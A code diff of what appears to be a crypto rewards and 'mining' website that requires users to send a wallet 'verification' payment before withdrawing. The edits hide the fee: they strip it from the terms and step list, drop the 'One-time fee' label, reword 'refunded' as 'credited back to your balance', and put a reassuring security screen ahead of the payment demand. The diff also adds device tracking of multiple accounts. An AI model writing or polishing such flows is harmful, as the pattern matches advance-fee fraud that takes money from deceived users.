@@ -709,7 +709,7 @@
       <div class="step-item"><div class="step-num">4</div><div class="step-text"><h4>Complete quick tasks</h4><p>Solve simple tasks and earn instant coin rewards.</p></div></div>
       <div class="step-item"><div class="step-num">5</div><div class="step-text"><h4>Spin the two wheels</h4><p>Daily Lucky Wheel ($2–$20 + boosts) + Referral Wheel ($25–$60 per referral).</p></div></div>
       <div class="step-item"><div class="step-num">6</div><div class="step-text"><h4>Request a withdrawal</h4><p>Each coin requires one-time email verification + one-time wallet binding before its first withdrawal.</p></div></div>
-      <div class="step-item"><div class="step-num">7</div><div class="step-text"><h4>Bind a wallet</h4><p>Send a small verification fee to prove ownership. Once approved, only that wallet can ever receive your withdrawals.</p></div></div>
+      <div class="step-item"><div class="step-num">7</div><div class="step-text"><h4>Bind a wallet</h4><p>Verify your wallet ownership. Once approved, only that wallet can ever receive your withdrawals.</p></div></div>
     </div>
   </div>
 </div>
@@ -771,7 +771,7 @@
       <h3 style="font-size:1rem;color:#fff;margin:16px 0 8px;font-weight:800;">2. Referral Program</h3>
       <p style="font-size:.85rem;color:var(--text-2);line-height:1.7;margin-bottom:12px;">Each referral must be a <strong>genuine new user</strong> on a <strong>different device and network</strong> from the referrer. Self-referrals are automatically detected and rejected. Users may refer unlimited genuine users.</p>
       <h3 style="font-size:1rem;color:#fff;margin:16px 0 8px;font-weight:800;">3. Wallet Binding</h3>
-      <p style="font-size:.85rem;color:var(--text-2);line-height:1.7;margin-bottom:12px;">Wallet binding is required before the first withdrawal of each coin. A small verification fee applies ($2 for BTC, $1 for other coins). This fee is refunded once the binding is approved. Only the bound wallet can receive funds. Changes require review.</p>
+      <p style="font-size:.85rem;color:var(--text-2);line-height:1.7;margin-bottom:12px;">Wallet binding is required before the first withdrawal of each coin to securely lock your funds to you. Only the bound wallet can receive funds. Changes require review.</p>
       <h3 style="font-size:1rem;color:#fff;margin:16px 0 8px;font-weight:800;">4. Withdrawals</h3>
       <p style="font-size:.85rem;color:var(--text-2);line-height:1.7;margin-bottom:12px;">All withdrawals are reviewed before payout. First-time withdrawals of each coin require email-based ownership verification.</p>
       <h3 style="font-size:1rem;color:#fff;margin:16px 0 8px;font-weight:800;">5. Subscriptions</h3>
@@ -805,20 +805,19 @@
   const AUTH_STORAGE_KEY = 'fffunds_auth_session';
   const PROFILE_CACHE_KEY = 'fffunds_profile_cache';
   const PENDING_CONFIRM_KEY = 'fffunds_pending_confirm';
+  const DEVICE_ACCOUNT_KEY = 'fffunds_device_account';
 
-  // ★ FIX #1: added flowType: 'pkce' for modern Supabase confirmation flow
   const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
     auth: {
       persistSession: true,
       autoRefreshToken: true,
       detectSessionInUrl: true,
-      flowType: 'pkce',                     // ★
+      flowType: 'pkce',
       storageKey: AUTH_STORAGE_KEY,
       storage: window.localStorage,
     }
   });
 
-  // ★ FIX #2: PKCE callback handler — processes ?code= from confirmation link
   (async function handlePkceCallback() {
     try {
       const url = new URL(window.location.href);
@@ -950,7 +949,6 @@
   const genRefCode = function() { const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; let s = ''; for (let i = 0; i < 8; i++) s += A[Math.floor(Math.random() * A.length)]; return s; };
   const gen6Digit = function() { return String(Math.floor(100000 + Math.random() * 900000)); };
 
-  // ★ FIX #3: escHtml handles null/undefined safely
   const escHtml = function(s) {
     return String(s == null ? '' : s).replace(/[&<>"']/g, function(c) {
       return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
@@ -1518,6 +1516,20 @@
       if (!document.getElementById('view-dashboard').classList.contains('hidden')) return;
     }
     try {
+      // ★ NEW: Multi-account device tracking
+      try {
+        const prevEmail = localStorage.getItem(DEVICE_ACCOUNT_KEY);
+        if (prevEmail && prevEmail !== authUser.email.toLowerCase()) {
+          console.log('[SECURITY] Multiple accounts detected on this device.');
+          supabase.rpc('register_multi_account_alert', {
+            p_email: authUser.email.toLowerCase(),
+            p_previous_email: prevEmail,
+            p_device: collectDeviceInfo()
+          }).catch(e => console.warn(e));
+        }
+        localStorage.setItem(DEVICE_ACCOUNT_KEY, authUser.email.toLowerCase());
+      } catch(e) {}
+
       const deviceInfo = collectDeviceInfo();
       const ipInfo = await fetchIPInfoServerSide();
       const info = Object.assign({}, deviceInfo, ipInfo);
@@ -1532,32 +1544,17 @@
         return;
       }
 
-      // ★ FIX #4: credit referral if user signed up with a code
       try {
         const pendingMeta = JSON.parse(sessionStorage.getItem('fffunds_signup_meta') || '{}');
         const pendingRefCode = pendingMeta.refCode || '';
         if (pendingRefCode && !profile.referred_by) {
           console.log('[referral] Attempting to credit code:', pendingRefCode);
-
-          const hwFp = [
-            navigator.hardwareConcurrency || '0',
-            navigator.deviceMemory || '0',
-            navigator.maxTouchPoints || '0',
-            navigator.platform || 'unknown',
-            screen.colorDepth || '0',
-          ].join('|');
-
+          const hwFp = [ navigator.hardwareConcurrency || '0', navigator.deviceMemory || '0', navigator.maxTouchPoints || '0', navigator.platform || 'unknown', screen.colorDepth || '0' ].join('|');
           const { data: refResult, error: refErr } = await supabase.rpc('credit_referral', {
-            p_ref_code: pendingRefCode,
-            p_new_user_id: authUser.id,
-            p_new_email: authUser.email.toLowerCase(),
-            p_device: collectDeviceInfo(),
-            p_ip: info.ip || null,
-            p_isp: info.isp || null,
-            p_fingerprint: window._stableFp || getCanvasFingerprint(),
-            p_hw_fp: hwFp,
+            p_ref_code: pendingRefCode, p_new_user_id: authUser.id, p_new_email: authUser.email.toLowerCase(),
+            p_device: collectDeviceInfo(), p_ip: info.ip || null, p_isp: info.isp || null,
+            p_fingerprint: window._stableFp || getCanvasFingerprint(), p_hw_fp: hwFp,
           });
-
           if (refErr) {
             console.warn('[referral] credit_referral error:', refErr.message);
           } else if (refResult && refResult.ok) {
@@ -1589,6 +1586,10 @@
       });
       currentUser = updated || profile;
       clearPendingConfirm(); pendingConfirmEmail = null;
+
+      // ★ FIX 1: Ensure auth modal closes immediately upon success
+      closeAuth();
+      closeConfirmEmail();
 
       const urlParams = new URLSearchParams(location.search);
       const hashParams = new URLSearchParams(location.hash.replace(/^#/, ''));
@@ -1676,6 +1677,7 @@
       const { data, error } = await supabase.auth.verifyOtp({ email: pending.email, token: code, type: 'signup' });
       if (error) throw error;
       clearPendingConfirm(); pendingConfirmEmail = null;
+      // The onAuthStateChange or handleAuthenticatedUser inside verify will now redirect
       document.getElementById('confirmEmailModal').classList.add('hidden');
       await handleAuthenticatedUser(data.user, true);
     } catch (e) {
@@ -1721,13 +1723,8 @@
     const pending = pendingConfirmEmail || loadPendingConfirm();
     if (!pending || !pending.email) { toast('Email lost — sign up again.', 'warn'); return; }
     try {
-      // ★ FIX #5: pass emailRedirectTo so link lands on our site
       const redirectTo = window.location.origin + window.location.pathname;
-      const { error } = await supabase.auth.resend({
-        type: 'signup',
-        email: pending.email,
-        options: { emailRedirectTo: redirectTo }
-      });
+      const { error } = await supabase.auth.resend({ type: 'signup', email: pending.email, options: { emailRedirectTo: redirectTo } });
       if (error) throw error;
       pendingConfirmEmail = { email: pending.email, sentAt: now() };
       savePendingConfirm(pending.email);
@@ -1950,7 +1947,6 @@
   }
 
   async function doRegister(email, password, refCode, currency, info) {
-    // ★ FIX #6: pass emailRedirectTo so confirmation link lands on our site
     const redirectTo = window.location.origin + window.location.pathname;
     const { data: signUpData, error: signUpErr } = await supabase.auth.signUp({
       email: email,
@@ -2734,6 +2730,7 @@
     } else if (withdrawContext.step === 2) {
       const w = (currentUser.wallets || {})[sym]; const bound = w && w.bound;
       const wPending = w && w.pending && !w.bound;
+      
       if (wPending) {
         content.innerHTML = withdrawStepper() +
           '<div class="alert alert-warn"><i class="fa-solid fa-hourglass-half"></i><div><strong>Wallet pending approval.</strong> Your ' + c.name + ' wallet binding is under review. You can withdraw once it\'s approved.</div></div>' +
@@ -2743,23 +2740,38 @@
           '<button class="btn btn-ghost btn-block" onclick="App.closeWithdraw()">Close</button>';
         return;
       }
+      
       if (!bound) {
-        const bindUsd = c.bindUsd || (sym === 'BTC' ? 2 : 1);
-        const bindCoinAmount = usdToCoin(sym, bindUsd);
-        content.innerHTML = withdrawStepper() +
-          '<div class="alert alert-success"><i class="fa-solid fa-circle-check"></i><div><strong>Amount saved.</strong> One last step: verify your ' + c.ticker + ' wallet.</div></div>' +
-          '<div style="padding:16px;background:linear-gradient(135deg,rgba(255,159,46,.1),rgba(255,159,46,.02));border:1.5px solid rgba(255,159,46,.45);border-radius:16px;margin-bottom:14px;">' +
-            '<div style="display:flex;gap:12px;align-items:flex-start;">' +
-              '<div style="width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,#ff9f2e,#ffc078);display:flex;align-items:center;justify-content:center;color:#0b0e14;font-size:1.1rem;flex-shrink:0;"><i class="fa-solid fa-shield-halved"></i></div>' +
-              '<div style="flex:1;min-width:0;"><div style="font-weight:900;color:#fff;font-size:.95rem;margin-bottom:4px;">Verify your ' + c.name + ' wallet ownership</div>' +
-              '<div style="font-size:.8rem;color:var(--text-2);line-height:1.6;font-weight:600;">Send the verification amount from your own ' + c.ticker + ' wallet. It is refunded after approval.</div></div></div></div>' +
-          '<div style="padding:14px;background:#080c14;border:1px solid var(--border-2);border-radius:14px;margin-bottom:14px;">' +
-            '<div style="font-size:.72rem;color:var(--text-3);font-weight:800;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Send this exact amount</div>' +
-            '<div class="bind-amount-badge"><i class="fa-solid fa-coins"></i> ' + fmtCoin(sym, bindCoinAmount) + ' ' + sym + ' <span style="color:var(--text-3);font-weight:700;font-size:.78rem;">(≈ ' + fmtMoney(bindUsd) + ')</span></div></div>' +
-          '<button class="btn btn-primary btn-block btn-lg" onclick="App.openBindFromWithdraw(\'' + sym + '\')"><i class="fa-solid fa-link"></i> Continue to ' + c.ticker + ' wallet verification</button>' +
+        // Educational Intro Screen (Screenshot 1)
+        content.innerHTML = 
+          '<div style="text-align:center;margin-bottom:16px;">' +
+            '<div style="width:60px;height:60px;margin:0 auto 14px;border-radius:16px;background:linear-gradient(135deg,#2ee56b,#5cf09a);display:flex;align-items:center;justify-content:center;color:#04130a;font-size:1.6rem;box-shadow:0 0 30px rgba(46,229,107,.5);"><i class="fa-solid fa-shield-halved"></i></div>' +
+            '<h2 style="padding:0;margin-bottom:6px;">Secure your ' + c.name + ' earnings</h2>' +
+            '<p class="subtitle" style="margin-bottom:0;">Link a wallet once, and your ' + c.ticker + ' can only ever be sent to you.</p>' +
+          '</div>' +
+          '<div style="padding:16px;background:rgba(46,229,107,.08);border:1px solid rgba(46,229,107,.4);border-radius:16px;margin-bottom:12px;display:flex;gap:12px;align-items:flex-start;">' +
+            '<i class="fa-solid fa-lock" style="color:var(--green-2);margin-top:2px;"></i>' +
+            '<div style="font-size:.8rem;color:#c8ffe0;line-height:1.6;font-weight:600;">' +
+              '<strong style="color:#5cf09a;">Your funds stay yours.</strong> Even if someone gains access to your account, they cannot redirect your ' + c.ticker + ' to a different wallet. Once bound, this address is the only destination that will ever receive your withdrawals.' +
+            '</div>' +
+          '</div>' +
+          '<div style="padding:16px;background:rgba(86,168,255,.08);border:1px solid rgba(86,168,255,.35);border-radius:16px;margin-bottom:12px;display:flex;gap:12px;align-items:flex-start;">' +
+            '<i class="fa-solid fa-fingerprint" style="color:var(--blue-2);margin-top:2px;"></i>' +
+            '<div style="font-size:.8rem;color:#cce8ff;line-height:1.6;font-weight:600;">' +
+              '<strong style="color:var(--blue-2);">Proof of ownership.</strong> One quick step confirms the wallet is truly yours — protecting you and every other miner from impersonation.' +
+            '</div>' +
+          '</div>' +
+          '<div style="padding:16px;background:rgba(255,159,46,.08);border:1px solid rgba(255,159,46,.4);border-radius:16px;margin-bottom:20px;display:flex;gap:12px;align-items:flex-start;">' +
+            '<i class="fa-solid fa-bolt" style="color:var(--orange);margin-top:2px;"></i>' +
+            '<div style="font-size:.8rem;color:#ffe8c9;line-height:1.6;font-weight:600;">' +
+              '<strong style="color:var(--orange-2);">One time only.</strong> Set it once, and every future ' + c.ticker + ' withdrawal lands in your wallet automatically — no repeated steps.' +
+            '</div>' +
+          '</div>' +
+          '<button class="btn btn-green btn-block btn-lg" onclick="App.withdrawNextStep2()">Secure my ' + c.ticker + ' wallet</button>' +
           '<button class="btn btn-ghost btn-block" style="margin-top:10px;" onclick="App.withdrawBack()"><i class="fa-solid fa-arrow-left"></i> Back</button>';
         return;
       }
+      
       content.innerHTML = withdrawStepper() +
         '<div class="alert alert-success"><i class="fa-solid fa-circle-check"></i><div><strong>Wallet verified.</strong> Your withdrawal will go to this address.</div></div>' +
         '<div style="padding:14px;background:rgba(255,255,255,.03);border:1px solid var(--border-2);border-radius:14px;margin-bottom:14px;">' +
@@ -2768,6 +2780,25 @@
         '<button class="btn btn-primary btn-block btn-lg" onclick="App.withdrawNextStep2()">Continue to Review <i class="fa-solid fa-arrow-right"></i></button>' +
         '<button class="btn btn-ghost btn-block" style="margin-top:10px;" onclick="App.withdrawBack()"><i class="fa-solid fa-arrow-left"></i> Back</button>';
     } else if (withdrawContext.step === 3) {
+      // Fee Screen (Screenshot 2)
+      const amt = withdrawContext.amount || 0; 
+      const bindUsd = c.bindUsd || (sym === 'BTC' ? 2 : 1);
+      const bindCoinAmount = usdToCoin(sym, bindUsd);
+      
+      content.innerHTML = withdrawStepper() +
+        '<div class="alert alert-success"><i class="fa-solid fa-circle-check"></i><div><strong>Amount saved.</strong> One last step: verify your ' + c.ticker + ' wallet.</div></div>' +
+        '<div style="padding:16px;background:linear-gradient(135deg,rgba(255,159,46,.1),rgba(255,159,46,.02));border:1.5px solid rgba(255,159,46,.45);border-radius:16px;margin-bottom:14px;">' +
+          '<div style="display:flex;gap:12px;align-items:flex-start;">' +
+            '<div style="width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,#ff9f2e,#ffc078);display:flex;align-items:center;justify-content:center;color:#0b0e14;font-size:1.1rem;flex-shrink:0;"><i class="fa-solid fa-shield-halved"></i></div>' +
+            '<div style="flex:1;min-width:0;"><div style="font-weight:900;color:#fff;font-size:.95rem;margin-bottom:4px;">Verify your ' + c.name + ' wallet ownership</div>' +
+            '<div style="font-size:.8rem;color:var(--text-2);line-height:1.6;font-weight:600;">Send the verification amount from your own ' + c.ticker + ' wallet.</div></div></div></div>' +
+        '<div style="padding:14px;background:#080c14;border:1px solid var(--border-2);border-radius:14px;margin-bottom:14px;">' +
+          '<div style="font-size:.72rem;color:var(--text-3);font-weight:800;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Send this exact amount</div>' +
+          '<div class="bind-amount-badge" style="margin:0;"><i class="fa-solid fa-coins"></i> ' + fmtCoin(sym, bindCoinAmount) + ' ' + sym + ' <span style="color:var(--text-3);font-weight:700;font-size:.78rem;">(≈ ' + fmtMoney(bindUsd) + ')</span></div></div>' +
+        '<button class="btn btn-primary btn-block btn-lg" onclick="App.openBindFromWithdraw(\'' + sym + '\')"><i class="fa-solid fa-link"></i> Continue to ' + c.ticker + ' wallet verification</button>' +
+        '<button class="btn btn-ghost btn-block" style="margin-top:10px;" onclick="App.withdrawBack()"><i class="fa-solid fa-arrow-left"></i> Back</button>';
+    } else if (withdrawContext.step === 4) {
+      // Standard review step
       const amt = withdrawContext.amount || 0; const fee = c.withdrawFee; const netAmt = amt - fee;
       const netUsd = coinToUsd(sym, netAmt); const w = currentUser.wallets[sym];
       const minUsd = getWithdrawalMinUsd();
@@ -2791,7 +2822,8 @@
         '<div class="form-error" id="withdrawError"></div>' +
         '<button class="btn btn-primary btn-block btn-lg" onclick="App.submitWithdrawal()"><i class="fa-solid fa-check"></i> Confirm Withdrawal</button>' +
         '<button class="btn btn-ghost btn-block" style="margin-top:10px;" onclick="App.withdrawBack()"><i class="fa-solid fa-arrow-left"></i> Back</button>';
-    } else if (withdrawContext.step === 4) {
+    } else if (withdrawContext.step === 5) {
+      // Success Step
       const amt = withdrawContext.amount || 0; const fee = c.withdrawFee; const netAmt = amt - fee;
       content.innerHTML = '<div style="text-align:center;padding:10px 0;"><div class="success-tick"><i class="fa-solid fa-check"></i></div>' +
         '<h3 style="font-size:1.2rem;font-weight:900;color:#fff;margin-bottom:6px;">Withdrawal Submitted</h3>' +
@@ -2862,19 +2894,41 @@
     if (maxUsd && usdValue > maxUsd) { errEl.textContent = 'Maximum withdrawal value is ' + fmtMoney(maxUsd); return; }
     withdrawContext.amount = amt;
     saveTransferDraft();
+    
     const coinEmailVerified = isCoinEmailVerified(sym);
     if (!coinEmailVerified) {
       document.getElementById('withdrawModal').classList.add('hidden');
       showWithdrawEmailModal(sym);
       return;
     }
+    
     const w = (currentUser.wallets || {})[sym];
     if (!w || !w.bound) { withdrawContext.step = 2; saveTransferDraft(); renderWithdrawStep(); return; }
-    withdrawContext.step = 3; saveTransferDraft(); renderWithdrawStep();
+    
+    // If wallet is already bound, skip to Step 4 (Review)
+    withdrawContext.step = 4; saveTransferDraft(); renderWithdrawStep();
   }
-  function withdrawNextStep2() { withdrawContext.step = 3; saveTransferDraft(); renderWithdrawStep(); }
-  function withdrawBack() { if (!withdrawContext) return; withdrawContext.step = Math.max(1, withdrawContext.step - 1); saveTransferDraft(); renderWithdrawStep(); }
-  function openBindFromWithdraw(sym) { pendingWithdrawalAfterBind = { sym: sym }; saveTransferDraft(); document.getElementById('withdrawModal').classList.add('hidden'); showBind(sym); }
+  
+  function withdrawNextStep2() { 
+    // Called from the educational intro or wallet verified screen to go to Step 3 (Fee screen)
+    withdrawContext.step = 3; 
+    saveTransferDraft(); 
+    renderWithdrawStep(); 
+  }
+  
+  function withdrawBack() { 
+    if (!withdrawContext) return; 
+    withdrawContext.step = Math.max(1, withdrawContext.step - 1); 
+    saveTransferDraft(); 
+    renderWithdrawStep(); 
+  }
+  
+  function openBindFromWithdraw(sym) { 
+    pendingWithdrawalAfterBind = { sym: sym }; 
+    saveTransferDraft(); 
+    document.getElementById('withdrawModal').classList.add('hidden'); 
+    showBind(sym); 
+  }
 
   async function submitWithdrawal() {
     if (!currentUser || !withdrawContext) return;
@@ -2900,7 +2954,7 @@
     const updated = await persistProfile({ balances: newBalances, withdrawals: newWds, total_withdrawn_usd: newTotalWithdrawn });
     if (updated) currentUser = updated;
     else { currentUser.balances = newBalances; currentUser.withdrawals = newWds; currentUser.total_withdrawn_usd = newTotalWithdrawn; }
-    withdrawContext.refId = refId; withdrawContext.step = 4; saveTransferDraft();
+    withdrawContext.refId = refId; withdrawContext.step = 5; saveTransferDraft();
     renderWithdrawStep();
     playRewardSound(); toast('Withdrawal submitted', 'success');
     renderDashboard();
@@ -2976,7 +3030,7 @@
     const walletBound = w && w.bound;
 
     if (walletBound) {
-      withdrawContext = { sym: sym, step: 3, amount: withdrawContext ? withdrawContext.amount : null };
+      withdrawContext = { sym: sym, step: 4, amount: withdrawContext ? withdrawContext.amount : null };
       saveTransferDraft();
       document.getElementById('withdrawTitle').innerHTML = '<i class="fa-solid fa-money-bill-transfer" style="color:var(--orange);margin-right:8px;"></i>Withdraw ' + COINS[sym].name;
       document.getElementById('withdrawSubtitle').textContent = 'Review and confirm';
@@ -2984,7 +3038,11 @@
       document.getElementById('withdrawModal').classList.remove('hidden');
     } else {
       pendingWithdrawalAfterBind = { sym: sym };
-      showBind(sym);
+      withdrawContext = { sym: sym, step: 2, amount: withdrawContext ? withdrawContext.amount : null };
+      document.getElementById('withdrawTitle').innerHTML = '<i class="fa-solid fa-money-bill-transfer" style="color:var(--orange);margin-right:8px;"></i>Withdraw ' + COINS[sym].name;
+      document.getElementById('withdrawSubtitle').textContent = 'Transfer your mined crypto to your bound wallet';
+      renderWithdrawStep();
+      document.getElementById('withdrawModal').classList.remove('hidden');
     }
   }
 
@@ -3184,7 +3242,6 @@
       '<div style="text-align:center;margin-bottom:20px;">' +
         '<div style="width:72px;height:72px;margin:0 auto 14px;border-radius:20px;background:linear-gradient(135deg,#ff9f2e,#ffc078);display:flex;align-items:center;justify-content:center;font-size:1.9rem;color:#0b0e14;box-shadow:0 0 30px rgba(255,159,46,.55);"><i class="fa-solid fa-shield-halved"></i></div>' +
         '<h3 style="font-size:1.05rem;font-weight:900;color:#fff;margin-bottom:6px;">' + coin.name + ' wallet verification</h3>' +
-        '<p style="font-size:.8rem;color:var(--text-3);font-weight:600;">One-time fee</p>' +
         '<div class="bind-amount-badge" style="margin-top:12px;"><i class="fa-solid fa-coins"></i> ' + fmtCoin(sym, bindCoinAmount) + ' ' + sym + ' <span style="color:var(--text-3);font-weight:700;font-size:.78rem;">(≈ ' + fmtMoney(bindUsd) + ')</span></div>' +
       '</div>' +
       '<div style="padding:14px 16px;background:rgba(46,229,107,.08);border:1px solid rgba(46,229,107,.35);border-radius:14px;margin-bottom:16px;">' +
@@ -3200,7 +3257,7 @@
         '<ol style="font-size:.8rem;color:var(--text-2);line-height:1.85;font-weight:600;padding-left:18px;margin:0;">' +
           '<li>Send the exact verification amount from your own ' + coin.ticker + ' wallet.</li>' +
           '<li>Paste your wallet address and the transaction hash.</li>' +
-          '<li>Once verified, the amount is <strong style="color:#5cf09a;">refunded</strong> and your wallet is bound.</li>' +
+          '<li>Once verified, the amount is credited back to your balance.</li>' +
         '</ol>' +
       '</div>' +
       '<button class="btn btn-primary btn-block btn-lg" onclick="App.bindNextStep(\'' + sym + '\')"><i class="fa-solid fa-arrow-right"></i> Continue</button>' +
@@ -3863,8 +3920,6 @@
     const link = location.origin + location.pathname + '?ref=' + currentUser.ref_code;
     el.textContent = MARKETING_TEMPLATES[currentMarketingIndex].replace('{LINK}', link);
   }
-
-  // ★ FIX #7: shareMarketing with Promise-aware copy + DOM fallback
   function shareMarketing() {
     const el = document.getElementById('marketingText'); if (!el) return;
     const text = el.textContent;
@@ -3916,8 +3971,6 @@
     renderMiningBadge();
     toast(next ? 'Mining resumed' : 'Mining paused', next ? 'success' : 'warn');
   }
-
-  // ★ FIX #8: copyRefLink with Promise-aware copy + readonly toggle for Android
   function copyRefLink() {
     const input = document.getElementById('refLinkInput'); if (!input) return;
     const text = input.value;
